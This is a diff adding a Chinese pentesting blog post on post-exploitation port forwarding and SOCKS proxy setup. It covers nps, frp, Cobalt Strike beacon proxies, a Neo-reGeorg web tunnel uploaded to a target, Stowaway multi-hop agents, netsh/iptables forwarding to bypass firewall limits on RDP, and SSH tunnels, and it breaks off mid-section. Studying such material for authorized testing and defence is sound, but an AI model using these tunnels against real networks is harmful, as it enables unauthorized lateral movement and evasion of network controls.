@@ -1,0 +1,363 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>端口转发与代理搭建 | Khaz's Blog</title><meta name="author" content="Khaz"><meta name="copyright" content="Khaz"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前置知识 SOCKS代理  SOCKS全称为Protocol For Sessions Traversal Across Firewall Securely，是一种代理协议，其只是简单地传递数据包，而并不关心是何种应用协议，标准端口为1080。 SOCKS代理有SOCKS4和SOCKS5两个版本。SOCKS4只支持TCP，而SOCKS5在SOCKS4 的基础上进一步扩展，可以支持UDP和各种身份验">
+<meta property="og:type" content="article">
+<meta property="og:title" content="端口转发与代理搭建">
+<meta property="og:url" content="http://fgtbnc.github.io/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/index.html">
+<meta property="og:site_name" content="Khaz&#39;s Blog">
+<meta property="og:description" content="前置知识 SOCKS代理  SOCKS全称为Protocol For Sessions Traversal Across Firewall Securely，是一种代理协议，其只是简单地传递数据包，而并不关心是何种应用协议，标准端口为1080。 SOCKS代理有SOCKS4和SOCKS5两个版本。SOCKS4只支持TCP，而SOCKS5在SOCKS4 的基础上进一步扩展，可以支持UDP和各种身份验">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fgtbnc.github.io/images/wallhaven-j8lqmp.jpg">
+<meta property="article:published_time" content="2023-05-01T02:26:00.000Z">
+<meta property="article:modified_time" content="2023-10-15T08:54:22.885Z">
+<meta property="article:author" content="Khaz">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fgtbnc.github.io/images/wallhaven-j8lqmp.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://fgtbnc.github.io/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":250},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '端口转发与代理搭建',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-10-15 16:54:22'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom/beauty.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://raw.githubusercontent.com/Khazing/typora-img/main/16870577801892f4a9c5aac2e9e5422a6ccd26db10dd88c73.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">79</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Khaz's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">端口转发与代理搭建</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-01T02:26:00.000Z" title="发表于 2023-05-01 10:26:00">2023-05-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-15T08:54:22.885Z" title="更新于 2023-10-15 16:54:22">2023-10-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="端口转发与代理搭建"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p><img src="/../images/v2-c489e7c96d4a67802a723372c38431f7_1440w.awebp" alt="img"></p>
+<p>SOCKS代理</p>
+<blockquote>
+<p>SOCKS全称为Protocol For Sessions Traversal Across Firewall Securely，是一种代理协议，其只是简单地传递数据包，而并不关心是何种应用协议，标准端口为1080。</p>
+<p>SOCKS代理有SOCKS4和SOCKS5两个版本。SOCKS4只支持<strong>TCP</strong>，而SOCKS5在SOCKS4 的基础上进一步扩展，可以支持UDP和各种身份验证机制等协议。</p>
+<p>在内网渗透中，通过搭建SOCKS代理，可以与目标内网主机进行通信，避免多次使用端口转发。</p>
+</blockquote>
+<h1 id="探测目标各种协议是否出网"><a href="#探测目标各种协议是否出网" class="headerlink" title="探测目标各种协议是否出网"></a>探测目标各种协议是否出网</h1><p><strong>ICMP</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping 114.114.114.114 -n 1	<span class="comment">#Windows</span></span><br><span class="line">ping 114.114.114.114 -c 1	<span class="comment">#Linux</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>HTTP</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p><strong>DNS</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nslookup baidu.com</span><br></pre></td></tr></table></figure>
+
+<p><strong>TCP</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Telent ip</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="代理搭建"><a href="#代理搭建" class="headerlink" title="代理搭建"></a>代理搭建</h1><p><img src="/../images/27cbd536f2e946798278123b5fb9572atplv-k3u1fbpfcp-watermark.png" alt="27cbd536f2e946798278123b5fb9572a~tplv-k3u1fbpfcp-watermark"></p>
+<h2 id="反向代理搭建–目标能访问VPS"><a href="#反向代理搭建–目标能访问VPS" class="headerlink" title="反向代理搭建–目标能访问VPS"></a>反向代理搭建–目标能访问VPS</h2><h3 id="Nps"><a href="#Nps" class="headerlink" title="Nps"></a>Nps</h3><ul>
+<li><p>服务端（公网服务器）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ./nps install	<span class="comment">#安装</span></span><br><span class="line">sudo nps start		<span class="comment">#启动</span></span><br><span class="line">sudo nps stop		<span class="comment">#停止</span></span><br><span class="line">sudo nps reload		<span class="comment">#服务端配置文件重载</span></span><br></pre></td></tr></table></figure>
+
+<p>配置文件<code>/etc/nps/conf/nps.conf</code>，主要修改</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># http代理</span></span><br><span class="line">http_proxy_ip=0.0.0.0</span><br><span class="line">http_proxy_port=80 </span><br><span class="line">https_proxy_port=443</span><br><span class="line">https_just_proxy=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##桥接</span></span><br><span class="line">bridge_type=tcp</span><br><span class="line">bridge_port=8024 <span class="comment">##客户端与服务端连接端口</span></span><br><span class="line">bridge_ip=0.0.0.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># web端设置</span></span><br><span class="line">web_host=xxx  <span class="comment"># 公网ip</span></span><br><span class="line">web_username=admin     <span class="comment"># web端登录账号密码 可以修改</span></span><br><span class="line">web_password=de1ta    </span><br><span class="line">web_port = 8080      <span class="comment"># web端端口</span></span><br></pre></td></tr></table></figure>
+
+<p>默认配置运行nps服务端启动会占用80，8080，8024端口</p>
+</li>
+<li><p>客户端（内网主机）</p>
+<p>使用无配置文件模式</p>
+<p><img src="/../images/image-20230918141729869.png" alt="image-20230918141729869"></p>
+<p><img src="/../images/image-20230918141750030.png" alt="image-20230918141750030"></p>
+<p>使用该命令启动客户端即可连接至服务端</p>
+<p>成功连接后，点击隧道按钮来创建隧道</p>
+<p><img src="/../images/image-20230918142001064.png" alt="image-20230918142001064"></p>
+</li>
+</ul>
+<h3 id="Frp"><a href="#Frp" class="headerlink" title="Frp"></a>Frp</h3><p><strong>服务端（公网服务器）</strong></p>
+<p>配置<code>frps.ini</code></p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span> <span class="comment"># 客户端与服务端通信的端口</span></span><br></pre></td></tr></table></figure>
+
+<p>启动</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">nohup</span> ./frps -c frps.ini &amp;</span><br></pre></td></tr></table></figure>
+
+<p><strong>客户端（内网主机）</strong></p>
+<p>配置<code>frpc.ini</code></p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">47.120</span>.<span class="number">7.67</span> <span class="comment"># 服务端IP</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span> <span class="comment">#  通信端口</span></span><br><span class="line"></span><br><span class="line"><span class="section">[socks5_proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp </span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">8888</span> <span class="comment"># 服务端代理端口</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">true</span>  <span class="comment"># 是否加密</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">true</span> <span class="comment"># 是否压缩</span></span><br></pre></td></tr></table></figure>
+
+<p>启动</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">start</span>/b C:\tmp\frpc.exe -c frpc.ini</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="CS的socks4代理"><a href="#CS的socks4代理" class="headerlink" title="CS的socks4代理"></a>CS的socks4代理</h3><p><strong>首先需要将心跳sleep设置为0</strong></p>
+<p>Beacon右键</p>
+<p><img src="/../images/image-20231014205724384.png" alt="image-20231014205724384"></p>
+<p><img src="/../images/image-20231014205748506.png" alt="image-20231014205748506"></p>
+<p>创建了socks4隧道</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socks4:CS服务端IP:选择的port</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="正向代理搭建–VPS能访问目标"><a href="#正向代理搭建–VPS能访问目标" class="headerlink" title="正向代理搭建–VPS能访问目标"></a>正向代理搭建–VPS能访问目标</h2><h3 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h3><ul>
+<li><p>生成服务端</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python neoreg.py generate -k password</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>上传对应的tunnel至目标主机</p>
+</li>
+<li><p>在本地建立Socks5代理</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python neoreg.py -k password -u http://xx/tunnel.php</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="多级代理"><a href="#多级代理" class="headerlink" title="多级代理"></a>多级代理</h2><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p><img src="/../images/b197db7d5642aacd23fe8b42fd65cd15.png" alt="img"></p>
+<h3 id="Stowaway"><a href="#Stowaway" class="headerlink" title="Stowaway"></a>Stowaway</h3><p><a target="_blank" rel="noopener" href="https://github.com/ph4ntonn/Stowaway">ph4ntonn&#x2F;Stowaway: 👻Stowaway – Multi-hop Proxy Tool for pentesters (github.com)</a></p>
+<p><strong>控制端VPS</strong></p>
+<ul>
+<li><p>开启监听</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 默认监听0.0.0.0，-s为密码</span></span><br><span class="line">./linux_x64_admin -l 8000 -s 123</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>节点管理</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">detail	展示在线节点的详细信息</span><br><span class="line">topo		展示在线节点的父子关系</span><br><span class="line">use			使用某个agent</span><br><span class="line"><span class="built_in">exit</span>		退出</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>第一层内网</strong></p>
+<p>win2012-1连接VPS端口</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># --reconnect重连间隔时间</span></span><br><span class="line">./windows_x64_agent.exe -c 192.168.125.134:8000 -s 123 --reconnect 8</span><br></pre></td></tr></table></figure>
+
+<p>控制端VPS</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use 0 <span class="comment"># 进入win2012-1节点</span></span><br><span class="line">socks 7777 admin admin <span class="comment"># 创建第一层内网代理</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>第二层内网</strong></p>
+<p>控制端VPS</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use 0 <span class="comment"># 进入win2012-1节点</span></span><br><span class="line">listen</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/362ce4a074848570144ecb77cd0e723b.png" alt="img"></p>
+<p>win7连接win2012-1端口</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># --reconnect重连间隔时间</span></span><br><span class="line">./windows_x64_agent.exe -c 192.168.10.9:10000 -s 123 --reconnect 8</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Frp-1"><a href="#Frp-1" class="headerlink" title="Frp"></a>Frp</h3><p><strong>第一层内网</strong></p>
+<p><strong>服务端（VPS）</strong></p>
+<p>配置<code>frps.ini</code></p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span> <span class="comment"># 客户端与服务端通信的端口</span></span><br></pre></td></tr></table></figure>
+
+<p>启动</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">nohup</span> ./frps -c frps.ini &amp;</span><br></pre></td></tr></table></figure>
+
+<p><strong>客户端（Win2012-1）</strong></p>
+<p>配置<code>frpc.ini</code></p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> =  <span class="number">192.168</span>.<span class="number">125.134</span> <span class="comment"># 服务端IP</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span> <span class="comment">#  通信端口</span></span><br><span class="line"></span><br><span class="line"><span class="section">[socks5_proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp </span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">8888</span> <span class="comment"># 服务端代理端口</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">true</span>  <span class="comment"># 是否加密</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">true</span> <span class="comment"># 是否压缩</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>第二层内网</strong></p>
+<p><strong>Win2012-1</strong></p>
+<p>配置<code>frps.ini</code></p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_addr</span> = <span class="number">192.168</span>.<span class="number">10.2</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br></pre></td></tr></table></figure>
+
+<p>配置<code>frpc.ini</code></p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> =  <span class="number">192.168</span>.<span class="number">125.134</span> <span class="comment"># 服务端IP</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span> <span class="comment">#  通信端口</span></span><br><span class="line"></span><br><span class="line"><span class="section">[socks5_proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp </span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">8888</span> <span class="comment"># 服务端代理端口</span></span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">true</span>  <span class="comment"># 是否加密</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">true</span> <span class="comment"># 是否压缩</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># plugin = socks5 # 不能加上这个</span></span><br><span class="line"><span class="comment">#相较于一级代理，增加如下代理服务器frps.ini</span></span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">192.168</span>.<span class="number">10.2</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">7777</span></span><br></pre></td></tr></table></figure>
+
+<p>启动</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">start/b C:\tmp\frps.exe -c frps.ini</span><br><span class="line">start/b C:\tmp\frpc.exe -c frpc.ini</span><br></pre></td></tr></table></figure>
+
+<p><strong>win7</strong></p>
+<p>配置<code>frpc.ini</code></p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">125.134</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[socks5_proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp </span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">8888</span> <span class="comment"># 服务端代理端口</span></span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">true</span>  <span class="comment"># 是否加密</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">true</span> <span class="comment"># 是否压缩</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><h2 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h2><ul>
+<li><p><strong>目标有公网IP</strong></p>
+<p><img src="/../images/image-20231015134119999.png" alt="image-20231015134119999"></p>
+<p>​	假设此时已经获取了Windows Server 2012的控制权,需要登录其远程桌面查看情况，但是防火墙对3389端口做了限制，不允许外网机器对3389端口进行连接。那么，通过端口转发，可以将3389端口转发到其他防火墙允许的端口上，如4444端口。</p>
+<p>​	效果：绕过防火墙限制，通过4444端口进行RDP远程连接</p>
+</li>
+<li><p><strong>内网主机端口转发到DMZ区主机端口</strong></p>
+<p><img src="/../images/image-20231015134055635.png" alt="image-20231015134055635"></p>
+<p>​	假设已经获取Windows Server 2012的控制权，经过信息收集，获得内网中MySQL服务器的SSH登录凭据，接下来需要登录这台服务器。但是服务器位于内网，无法直接通过IP地址进行访问，所以需要通过端口映射，将 MySQL服务器的22端口映射到Windows Server 2012上的端口如2222。</p>
+<p>​	效果：访问DMZ区的Windows Server 2012的2222端口实质上是访问内网MySql服务器的22端口</p>
+</li>
+<li><p><strong>目标无公网IP</strong></p>
+<p><img src="/../images/image-20231015134450143.png" alt="image-20231015134450143"></p>
+<p>​	假设已经获取 Windows Server 2012的控制权，需要登录其远程桌面查看情况，但是Windows Server 2012没有公网IP地址,无法直通过IP地址进行访问,所以需要公网VPS监听一个端口，将Windows Server 2012的3389端口转发到VPS的端口如4444上。</p>
+<p>​	效果：访问VPS的4444端口实质上是访问Windows Server 2012的3389端口</p>
+</li>
+</ul>
+<h2 id="如何转发"><a href="#如何转发" class="headerlink" title="如何转发"></a>如何转发</h2><h3 id="Windows-netsh-端口转发（双网卡用）"><a href="#Windows-netsh-端口转发（双网卡用）" class="headerlink" title="Windows netsh 端口转发（双网卡用）"></a>Windows netsh 端口转发（双网卡用）</h3><p><code>netsh</code>仅支持TCP协议， 适用于<strong>双网卡</strong>服务器</p>
+<p>将内网的3389端口转发到外网的6666端口上，实现访问外网的6666端口即访问内网的3389端口</p>
+<p><strong>启动转发</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看现有规则</span></span><br><span class="line">netsh interface portproxy show all</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加转发规则</span></span><br><span class="line">netsh interface portproxy <span class="built_in">set</span> v4tov4 listenaddress=外网IP listenport=6666 connectaddress=内网IP connectport=3389</span><br></pre></td></tr></table></figure>
+
+<p><strong>取消转发</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#删除转发规则</span></span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=6666</span><br><span class="line"></span><br><span class="line"><span class="comment">#xp需要安装ipv6</span></span><br><span class="line">netsh interface ipv6 install</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Linux-iptables-端口转发（高权限用）"><a href="#Linux-iptables-端口转发（高权限用）" class="headerlink" title="Linux iptables 端口转发（高权限用）"></a>Linux iptables 端口转发（高权限用）</h3><p>将内网的3389端口转发到外网的3389端口上</p>
+<p><strong>编辑配置文件</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/sysctl.conf</span><br><span class="line">net.ipv4.ip_forward = 1<span class="comment">#开启IP转发</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>关闭服务</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service iptables stop</span><br></pre></td></tr></table></figure>
+
+<p><strong>配置规则</strong></p>
+<p>假设</p>
+<p>需要访问的内网地址：10.1.1.11（Windows）</p>
+<p>内网边界web服务器：192.168.100.100（Linux）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING --dst 192.168.100.100 -p tcp --dport 3389 -j DNAT--to-destination 10.1.1.11:3389</span><br></pre></td></tr></table></figure>
+
+<p>将目标IP为192.168.100.100且目标端口为3389的TCP数据包，转发到10.1.1.11的3389端口。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A POSTROUTING --dst 10.1.1.11 -p tcp --dport 3389 -j SNAT --to-source 192.168.100.100</span><br></pre></td></tr></table></figure>
+
+<p>将目标IP为10.1.1.11且目标端口为3389的TCP数据包，发送出去时，将源IP地址改为192.168.100.100</p>
+<p>(相当于实现了网络地址转换（NAT），将内部私有网络中的IP地址转换为公网IP地址)</p>
+<p><strong>保存并重启服务</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service iptables save &amp;&amp; service iptables start</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="SSH端口转发"><a href="#SSH端口转发" class="headerlink" title="SSH端口转发"></a>SSH端口转发</h1><blockquote>
+<p>SSH 端口转发功能能够将其他 TCP 端口的网络数据通过 SSH 链接来转发，并且自动提供了相应的加密及解密服务。其实这一技术就是我们常常听说的隧道(tunnel)技术，原因是 SSH 为其他 TCP 链接提供了一个安全的通道来进行传输。</p>
+</blockquote>
+<p>推荐阅读：<a target="_blank" rel="noopener" href="https://lotabout.me/2019/SSH-Port-Forwarding/">SSH 端口转发教程 | 三点水 (lotabout.me)</a></p>
+<h2 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h2><p><strong>本地端口转发指的是在本机上发起请求，由 ssh client 转发到远程的机器上</strong></p>
+<p><img src="/../images/local-port-forwarding-two.svg" alt="img"></p>
+<p>假设A为攻击机VPS，B为DMZ区主机，C为内网主机，A能访问B</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ssh client即攻击机VPS执行</span></span><br><span class="line">ssh -CfNg -L 1234:ip_c:3389 user_b@ip_b</span><br></pre></td></tr></table></figure>
+
+<p>参数解释</p>
